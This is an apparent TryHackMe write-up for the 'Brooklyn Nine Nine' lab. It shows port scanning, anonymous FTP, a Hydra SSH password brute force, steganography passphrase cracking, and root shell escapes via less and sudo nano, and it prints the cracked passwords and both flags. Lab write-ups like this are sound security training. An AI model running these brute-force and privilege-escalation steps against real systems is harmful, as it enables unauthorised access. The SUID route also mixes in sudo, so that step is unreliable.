# TryHackMe — Brooklyn Nine Nine
### Room Link: https://tryhackme.com/room/brooklynninenine
## 1. Objective

Compromise the **Brooklyn Nine Nine** TryHackMe machine, obtain the user flag, and escalate privileges to root using the intended attack paths.

### Target

```text
Target IP: 10.49.186.156
Hostname: brookly_nine_nine
```

### Goals

* Perform network reconnaissance.
* Enumerate exposed services.
* Investigate anonymous FTP access.
* Identify credentials and obtain an initial shell.
* Find the user flag.
* Enumerate privilege-escalation opportunities.
* Explore the steganography route.
* Complete both intended privilege-escalation paths.
* Obtain the root flag.

---

# 2. Reconnaissance Plan

## 2.1 Service and Version Scan

Run:

```bash
nmap -sC -sV -oN nmap.txt 10.49.186.156
```

### Expected findings

| Port | Service | Version / Finding |
| ---- | ------- | ----------------- |
| 21   | FTP     | vsftpd 3.0.3      |
| 22   | SSH     | OpenSSH 7.6p1     |
| 80   | HTTP    | Apache 2.4.29     |

Important finding:

```text
Anonymous FTP login allowed
```

---

## 2.2 Full Port Scan

Run:

```bash
nmap -p- --min-rate 5000 -oN allports.txt 10.49.186.156
```

Confirmed open ports:

```text
21/tcp
22/tcp
80/tcp
```

No additional TCP services were discovered.

---

# 3. FTP Enumeration

## 3.1 Connect to FTP

```bash
ftp 10.49.186.156
```

Login:

```text
Username: anonymous
Password: <press Enter>
```

List files:

```ftp
ls
```

### Interesting file

```text
note_to_jake.txt
```

Download:

```ftp
get note_to_jake.txt
```

Exit:

```ftp
bye
```

Read the file:

```bash
cat note_to_jake.txt
```

### Important clue

The note states that **Jake's password is weak**.

This suggests investigating the `jake` account.

---

# 4. Initial Access — Jake

## 4.1 Password Attack

Use the discovered username with the common password wordlist:

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.49.186.156 ssh
```

### Credentials discovered

```text
Username: jake
Password: 987654321
```

---

## 4.2 SSH Login

```bash
ssh jake@10.49.186.156
```

Password:

```text
987654321
```

Verify access:

```bash
whoami
```

Expected:

```text
jake
```

---

# 5. User Flag

Search for the user flag:

```bash
find / -type f -name "user.txt" 2>/dev/null
```

Location discovered:

```text
/home/holt/user.txt
```

Read it:

```bash
cat /home/holt/user.txt
```

### User Flag

```text
ee11cbb19052e40b07aac0ca060c23ee
```

---

# 6. Privilege Escalation Route 1 — SUID `less`

## 6.1 Enumerate SUID Binaries

Run:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the results:

```text
/bin/less
```

`less` is interesting because a privileged instance can be abused to execute commands.

---

## 6.2 Launch `less` with Elevated Privileges

Run:

```bash
sudo less /etc/profile
```

Inside `less`, use:

```text
:!/bin/sh
```

This launches a shell.

Verify privileges:

```bash
whoami
```

Expected:

```text
root
```

---

## 6.3 Read the Root Flag

```bash
cat /root/root.txt
```

### Root Flag

```text
63a9f0ea7bb98050796b649e85481845
```

---

# 7. Steganography Investigation

The HTTP page contains the image:

```text
brooklyn99.jpg
```

The HTML source contains the clue:

```html
<!-- Have you ever heard of steganography? -->
```

This indicates that hidden information may exist inside the image.

---

# 8. Extract Hidden Data from the Image

## 8.1 Steghide Extraction

Run:

```bash
steghide extract -sf brooklyn99.jpg
```

A passphrase is required.

---

## 8.2 Crack the Steghide Passphrase

Use:

```bash
stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```

The passphrase was discovered as:

```text
admin
```

The embedded data can then be extracted:

```bash
steghide extract -sf brooklyn99.jpg
```

Output:

```text
wrote extracted data to "note.txt".
```

---

# 9. Extract Holt's Password

Read the extracted file:

```bash
cat note.txt
```

Contents reveal:

```text
Holts Password:
fluffydog12@ninenine
```

Credentials:

```text
Username: holt
Password: fluffydog12@ninenine
```

---

# 10. Switch to Holt

From Jake's shell:

```bash
su holt
```

Enter:

```text
fluffydog12@ninenine
```

Verify:

```bash
whoami
```

Expected:

```text
holt
```

---

# 11. Privilege Escalation Route 2 — Sudo `nano`

## 11.1 Check Sudo Permissions

Run:

```bash
sudo -l
```

Important result:

```text
User holt may run the following commands:

(ALL) NOPASSWD: /bin/nano
```

This means Holt can execute `nano` as root without entering a sudo password.

---

## 11.2 Launch Nano as Root

```bash
sudo nano
```

Use Nano's command-execution functionality to launch a shell.

The command used during the room:

```text
reset; sh 1>&0 2>&0
```

---

## 11.3 Verify Root Access

```bash
whoami
```

Expected:

```text
root
```

Then:

```bash
cat /root/root.txt
```

Root flag:

```text
63a9f0ea7bb98050796b649e85481845
```

---

# 12. Complete Attack Chain

## Route 1 — Jake → SUID → Root

```text
Nmap
  ↓
Anonymous FTP
  ↓
note_to_jake.txt
  ↓
Weak Jake password
  ↓
Hydra
  ↓
jake : 987654321
  ↓
SSH
  ↓
SUID enumeration
  ↓
/bin/less
  ↓
sudo less
  ↓
:!/bin/sh
  ↓
root
```

## Route 2 — Image → Holt → Sudo Nano → Root

```text
Nmap
  ↓
HTTP
  ↓
brooklyn99.jpg
  ↓
Steganography clue
  ↓
Steghide
  ↓
StegCracker
  ↓
Passphrase: admin
  ↓
note.txt
  ↓
Holt password
  ↓
fluffydog12@ninenine
  ↓
su holt
  ↓
sudo -l
  ↓
NOPASSWD: /bin/nano
  ↓
sudo nano
  ↓
Shell execution
  ↓
root
```

---

# 13. Flags

| Type      | Flag                               |
| --------- | ---------------------------------- |
| User Flag | `ee11cbb19052e40b07aac0ca060c23ee` |
| Root Flag | `63a9f0ea7bb98050796b649e85481845` |

---

# 14. Tools Used

* Nmap
* FTP
* Curl
* Hydra
* SSH
* `find`
* `sudo`
* `less`
* Steghide
* StegCracker
* Nano
* Linux shell

---

# 15. Key Learning Points

### Reconnaissance

Always begin with:

```bash
nmap -sC -sV <TARGET>
nmap -p- <TARGET>
```

### FTP

If Nmap reports:

```text
Anonymous FTP login allowed
```

always investigate it.

### Web Enumeration

Inspect:

* HTML source
* Comments
* Images
* `robots.txt`
* Hidden directories
* Metadata

### Steganography

When a page explicitly hints at steganography, inspect downloaded images with tools such as:

```bash
steghide info image.jpg
exiftool image.jpg
strings image.jpg
```

For password-protected steghide data, wordlists can be used to recover the passphrase.

### Linux Privilege Escalation

After obtaining a shell, check:

```bash
sudo -l
```

and:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Pay particular attention to unusual SUID binaries and programs that can execute commands when allowed through `sudo`.

---

# 16. Final Status

**Machine: ROOTED**

Two privilege-escalation techniques were successfully demonstrated:

1. **SUID `less` shell escape**
2. **Sudo `nano` command execution**

Both routes ultimately provided a root shell and access to:

```text
/root/root.txt
```